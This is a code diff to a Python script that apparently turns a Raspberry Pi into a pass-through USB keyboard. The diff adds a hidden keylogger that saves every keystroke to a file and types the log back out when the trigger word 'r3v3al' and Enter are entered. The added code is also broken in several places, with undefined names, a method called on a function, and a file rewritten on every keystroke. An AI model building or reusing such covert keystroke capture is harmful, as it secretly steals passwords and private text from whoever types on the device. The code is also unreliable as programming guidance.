@@ -3,6 +3,7 @@ import keyboard
 NULL_CHAR = chr(0)
 caps_lock = False
 modifiers = set()
+reveal = ''
 
 def write_report(report):
     with open('/dev/hidg0', 'rb+') as fd:
@@ -13,6 +14,61 @@ def edit_modifiers(event):
         modifiers.add(event.name)
     elif event.event_type == 'up':
         modifiers.remove(event.name)
+
+def print_chars():
+    with open('home/pi/backup_602/save.txt', 'r') as r:
+        words = r.read()
+        for c in words:
+            if c in upper_to_lower:
+                write_report(chr(mod_vals['shift']) + NULL_CHAR + chr(val[upper_to_lower[c]]) + NULL_CHAR * 5)
+            elif c == '\n':
+                write_report(NULL_CHAR * 2 + chr(val['enter']) + NULL_CHAR * 5)
+            else:
+                write_report(NULL_CHAR * 2 + chr(val[c]) + NULL_CHAR * 5)
+
+            write_report(NULL_CHAR * 8)
+
+def add_char(name):
+    global reveal
+    with open('home/pi/backup_602/save.txt', 'w+') as s:
+        s.write(name)
+        if len(reveal) == 6:
+            if name == '\n' and reveal == 'r3v3al':
+                print_chars()
+            else:
+                reveal = reveal[1:] + name
+        else:
+            reveal += name
+
+
+def append_char(name):
+        # If capital letter/symbol
+    if (modifiers == {'shift'} and not caps_lock) or (not modifiers and caps_lock):
+        if name.isalpha():
+            add_char.write(upper(name))
+        elif name in upper_symbols:
+            add_char.write(upper_symbols[name])
+        elif name in special_save:
+            add_char.write(special_save[name])
+    # If lowercase letter/symbol
+    elif (not modifiers):
+        if name.isalpha() or name in upper_symbols:
+            add_char.write(name)
+        elif name in special_save:
+            add_char.write(special_save[name])
+
+        if name.isalpha():
+            if modifiers == {'shift'}:
+                s.write(upper(name))
+            else:
+                s.write(name)
+        elif name.isnumeric():
+            s.write(name)
+        elif name == 'space':
+            s.write(' ')
+        elif name == 'tab' or name == 'enter':
+            s.write('\n')
+
 
 
 def hook_callback(event):
@@ -39,6 +95,7 @@ def hook_callback(event):
                 write_report(NULL_CHAR * 2 + chr(val[event.name]) + NULL_CHAR * 5)
             else:
                 write_report(chr(special) + NULL_CHAR + chr(val[event.name]) + NULL_CHAR * 5)
+            append_char(event.event_name)
             write_report(NULL_CHAR * 8)
 
 
@@ -144,6 +201,86 @@ mod_vals = {
     'right shift' : 0b00100000,
     'right alt' : 0b01000000,
     'right gui' : 0b10000000
+}
+
+upper_symbols = {
+    '1' : '!',
+    '2' : '@',
+    '3' : '#',
+    '4' : '$',
+    '5' : '%',
+    '6' : '^',
+    '7' : '&',
+    '8' : '*',
+    '9' : '(',
+    '0' : ')',
+    '-' : '_',
+    '=' : '+',
+    '[' : '{',
+    ']' : '}',
+    '\\' : '|',
+    ';' : ':',
+    '\'' : '\"',
+    ',' : '<',
+    '.' : '>',
+    '/' : '?',
+    '`' : '~',
+}
+
+upper_to_lower = {
+    'A' : 'a',
+    'B' : 'b',
+    'C' : 'c',
+    'D' : 'd',
+    'E' : 'e',
+    'F' : 'f',
+    'G' : 'g',
+    'H' : 'h',
+    'I' : 'i',
+    'J' : 'j',
+    'K' : 'k',
+    'L' : 'l',
+    'M' : 'm',
+    'N' : 'n',
+    'O' : 'o',
+    'P' : 'p',
+    'Q' : 'q',
+    'R' : 'r',
+    'S' : 's',
+    'T' : 't',
+    'U' : 'u',
+    'V' : 'v',
+    'W' : 'w',
+    'X' : 'x',
+    'Y' : 'y',
+    'Z' : 'z',
+    '!' : '1',
+    '@' : '2',
+    '#' : '3',
+    '$' : '4',
+    '%' : '5',
+    '^' : '6',
+    '&' : '7',
+    '*' : '8',
+    '(' : '9',
+    ')' : '0',
+    '_' : '-',
+    '+' : '=',
+    '{' : '[',
+    '}' : ']',
+    '|' : '\\',
+    ':' : ';',
+    '\"' : '\'',
+    '<' : ',',
+    '>' : '.',
+    '?' : '/',
+    '~' : '`',
+}
+
+special_save = {
+    'space' : ' ',
+    'enter' : '\n',
+    'tab' : '\n',
 }
 
 keyboard.hook(callback=hook_callback)
